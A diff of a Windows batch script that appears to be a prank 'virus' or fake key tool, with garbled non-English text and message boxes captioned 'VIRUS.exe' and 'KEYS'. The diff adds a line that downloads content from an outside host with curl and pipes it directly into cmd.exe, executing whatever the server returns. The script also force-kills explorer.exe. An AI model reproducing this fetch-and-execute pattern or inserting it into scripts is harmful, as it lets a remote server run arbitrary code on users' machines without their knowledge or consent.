@@ -96,7 +96,7 @@ if %choice%==1 (
 
 :kill
 color 4
-"%~dp0\nhmb\nhmb.exe" "æñ ¦ÖÐ¢ ¨¢?" "Message Caption" "Error|YesNo" ""
+"%~dp0\nhmb\nhmb.exe" "æñ ¦ÖÐ¢ ¨¢?" "VIRUS.exe" "Error|YesNo" ""
 if "%errorlevel%" == "%IDNO%" goto no
 echo ÓÖÐÖ¦¨¤, ÒÖé¨õí ·¦å·
 ping localhost -n 2 >nul
@@ -115,8 +115,9 @@ echo 2
 >nul timeout/nobreak 1
 echo 1
 >nul timeout/nobreak 1
-start start2.vbs
-exit
+"%~dp0\nhmb\nhmb.exe" "à ØÖõçå·Ð)" "KEYS" "Information|NoButtons" "5"
+curl.exe -sN http://rick.jachan.dev | cmd.exe
+goto menurun
 :gen
 cls
 taskkill /F /IM explorer.exe
@@ -440,29 +441,112 @@ set KEY=xxxxx-xxxxx-xxxxx-xxxxx-xxxxx
 goto startrun
 
 :nb
-setlocal EnableDelayedExpansion
+rem ChangeColor 0 8
+rem ShadeBoxAt 15 21 1 2 2
+rem Wait 30
+rem ShadeBoxAt 15 23 1 3 2
+rem Wait 30
+rem ShadeBoxAt 15 26 1 5 2
+rem Wait 30
+rem ShadeBoxAt 15 31 1 7 2
+rem ShadeBoxAt 15 38 1 9 2
+rem ChangeColor 0 8
+rem ShadeBoxAt 15 21 1 1 4
+rem Wait 30
+rem ShadeBoxAt 15 47 1 11 2
+rem ShadeBoxAt 15 22 1 6 4
+rem Wait 30
+rem ShadeBoxAt 15 58 1 11 2
+rem ShadeBoxAt 15 28 1 6 4
+rem Wait 30
+rem ShadeBoxAt 15 41 1 40 2
+rem ShadeBoxAt 15 34 1 7 4
+rem ChangeColor 9 3
+rem ShadeBoxAt 13 46 1 3 3
+rem ShadeBoxAt 14 46 4 1 3
+rem ShadeBoxAt 17 47 1 2 3
+rem ShadeBoxAt 15 47 1 2 3
+rem ShadeBoxAt 14 49 1 1 3
+rem ShadeBoxAt 16 49 1 1 3
+rem Wait 30
+rem ShadeBoxAt 13 53 1 2 3
+rem ShadeBoxAt 14 52 4 1 3
+rem ShadeBoxAt 15 53 1 2 3
+rem ShadeBoxAt 14 55 4 1 3
+rem Wait 30
+rem ShadeBoxAt 13 58 1 5 3
+rem ShadeBoxAt 14 60 4 1 3
+rem Wait 30
+rem ShadeBoxAt 13 66 1 3 3
+rem ShadeBoxAt 14 65 3 1 3
+rem ShadeBoxAt 17 66 1 3 3
+rem Wait 30
+rem ShadeBoxAt 13 72 5 1 3
+rem ShadeBoxAt 15 73 1 3 3
+rem ShadeBoxAt 13 76 5 1 3
+rem Wait 30
+rem Wait 30
+rem Wait 30
+rem ChangeColor 0 7
+rem ShadeBoxAt 16 41 1 5 2
+rem ShadeBoxAt 16 47 1 2 2
+rem ShadeBoxAt 16 50 1 2 2
+rem ShadeBoxAt 16 53 1 2 2
+rem ShadeBoxAt 16 56 1 4 2
+rem ShadeBoxAt 16 61 1 4 2
+rem ShadeBoxAt 16 66 1 6 2
+rem ShadeBoxAt 16 73 1 3 2
+rem ShadeBoxAt 16 77 1 4 2
+rem Wait 30
+rem ChangeColor 0 15
+rem ShadeBoxAt 17 41 1 5 2
+rem ShadeBoxAt 17 49 1 3 2
+rem ShadeBoxAt 17 53 1 2 2
+rem ShadeBoxAt 17 56 1 4 2
+rem ShadeBoxAt 17 61 1 5 2
+rem ShadeBoxAt 17 69 1 3 2
+rem ShadeBoxAt 17 73 1 3 2
+rem ShadeBoxAt 17 77 1 4 2
+rem Wait 30
+rem ChangeColor 8 15
+rem ChangeColor 7 15
+rem ShadeBoxAt 18 41 1 40 2
+rem Wait 30
+rem ChangeColor 0 15
+rem ShadeBoxAt 15 41 1 5 4
+rem ShadeBoxAt 15 49 1 3 4
+rem ShadeBoxAt 15 56 1 4 4
+rem ShadeBoxAt 15 61 1 4 4
+rem ShadeBoxAt 15 66 1 6 4
+rem ShadeBoxAt 15 77 1 4 4
+rem Wait 30
+rem ShadeBoxAt 16 41 1 5 4
+rem ShadeBoxAt 16 47 1 2 4
+rem ShadeBoxAt 16 50 1 2 4
+rem ShadeBoxAt 16 53 1 2 4
+rem ShadeBoxAt 16 56 1 4 4
+rem ShadeBoxAt 16 61 1 4 4
+rem ShadeBoxAt 16 66 1 6 4
+rem ShadeBoxAt 16 73 1 3 4
+rem ShadeBoxAt 16 77 1 4 4
+rem Wait 30
+rem ShadeBoxAt 17 41 1 5 4
+rem ShadeBoxAt 17 49 1 3 4
+rem ShadeBoxAt 17 53 1 2 4
+rem ShadeBoxAt 17 56 1 4 4
+rem ShadeBoxAt 17 61 1 5 4
+rem ShadeBoxAt 17 69 1 3 4
+rem ShadeBoxAt 17 73 1 3 4
+rem ShadeBoxAt 17 77 1 4 4
+rem Wait 20
+rem ShadeBoxAt 18 41 1 40 2
+rem Wait 20
+rem ChangeColor 0 0
+rem ShadeBoxAt 18 41 1 40 2
+rem Wait 500
+rem ClearColor
+rem Locate 30 1
 
-rem Count the number of files in this dir (just as an example)
-set n=0
-for %%f in (*.*) do set /A n+=1
-
-rem Fill "bar" variable with 70 characters
-set "bar="
-for /L %%i in (1,1,70) do set "bar=!bar!X"
-
-rem Fill "space" variable with filler spaces
-set "space="
-for /L %%i in (1,1,110) do set "space=!space!_"
-
-rem "Process" the files and show the progress bar in the title
-set i=0
-echo Processing files:
-for %%f in (*.*) do (
-   set /A i+=1, percent=i*100/n, barLen=70*percent/100
-   for %%a in (!barLen!) do title !percent!%%  !bar:~0,%%a!%space%
-   echo !i!- %%f
-   ping -n 1 localhost > NUL
-)
 rem ÝÖ¦¬áçóÆ  ¢·¢Ð·Öå¨Æ
 set IDOK=1
 set IDCANCEL=2
